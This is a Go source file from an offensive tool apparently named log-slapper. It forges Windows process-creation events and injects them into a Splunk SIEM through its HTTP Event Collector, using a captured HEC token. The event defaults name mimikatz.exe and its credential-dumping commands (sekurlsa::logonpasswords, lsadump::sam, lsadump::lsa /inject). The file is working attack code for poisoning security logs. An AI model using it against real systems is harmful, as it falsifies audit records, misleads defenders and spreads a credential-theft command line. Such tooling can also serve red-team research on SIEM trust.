package attacks

import (
	"flag"
	"fmt"
	"time"

	"github.com/oz9un/log-slapper/pkg/splunk"
	"github.com/pterm/pterm"
)

var creationTime time.Time

func ProcessCreateGetInput() (string, string, string, string, string, string) {
	// Ask for the target domain name
	domainPrompt := pterm.DefaultInteractiveTextInput.WithDefaultValue("example.com")
	targetDomain, _ := domainPrompt.Show("Enter the target domain name")

	// Ask for the target subnet
	hostnamePrompt := pterm.DefaultInteractiveTextInput.WithDefaultValue("DC-01")
	targetHostname, _ := hostnamePrompt.Show("Enter the target hostname")

	// Ask for the target ip
	ipPrompt := pterm.DefaultInteractiveTextInput.WithDefaultValue("10.10.41.70")
	targetIp, _ := ipPrompt.Show("Enter the target ip")

	// Ask for the target subnet
	processNamePrompt := pterm.DefaultInteractiveTextInput.WithDefaultValue("C:\\Users\\Public\\Desktop\\mimikatz.exe")
	processName, _ := processNamePrompt.Show("Enter the process name (full path)")

	// Ask for the target subnet
	processParametersPrompt := pterm.DefaultInteractiveTextInput.WithDefaultValue("\"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::lsa /inject\" \"lsadump::sam\" \"lsadump::cache\" \"sekurlsa::ekeys\" \"exit\"")
	processParameters, _ := processParametersPrompt.Show("Enter the process parameters)")

	// Ask for the target account name
	accountPrompt := pterm.DefaultInteractiveTextInput.WithDefaultValue("administrator")
	targetAccount, _ := accountPrompt.Show("Enter the target account name")

	timePrompt := pterm.DefaultInteractiveTextInput.WithDefaultValue("24/03/2024 17:16")
	creationTime, _ := timePrompt.Show("Enter the process creation time")

	ProcessCreateEventParameterCheck(creationTime)

	return targetDomain, targetHostname, targetIp, processName, processParameters, targetAccount
}

func ProcessCreateEventParameterCheck(_creationTime string) bool {
	// Check for required flags or use default values
	if _creationTime == "" {
		pterm.Error.Println("Missing required flags: -starttime is required.")
		flag.Usage()
		return false
	}

	var err error

	// Parse start and end time
	creationTime, err = time.Parse(timeFormat, _creationTime)
	if err != nil {
		pterm.Error.Println("Invalid start time format: %v\n", err)
		return false
	}
	return true
}

func ProcessCreateEvent(targetDomain string, targetHostname string, targetIp string, processName string, processParameters string, targetAccount string, HEC_url string, HEC_token string) {
	var data [][]string

	formattedTime_str, formattedTime := splunk.FormatWithRandomSeconds(creationTime)

	event := splunk.GenerateProcessCreationEvent(targetDomain, targetIp, targetHostname, formattedTime, targetAccount, processName, processParameters)

	err := splunk.SendHECEvent(HEC_url, HEC_token, event)
	if err != nil {
		fmt.Println("Error sending process creation event\n")
	}

	data = append(data, []string{targetHostname, targetIp, processName, processParameters, formattedTime_str})
	//fmt.Printf("Execve event sent successfully.\n")

	pterm.DefaultTable.WithHasHeader().WithBoxed().WithData(pterm.TableData(append([][]string{{"Hostname", "IP", "Process", "Parameters", "Time"}}, data...))).Render()
}
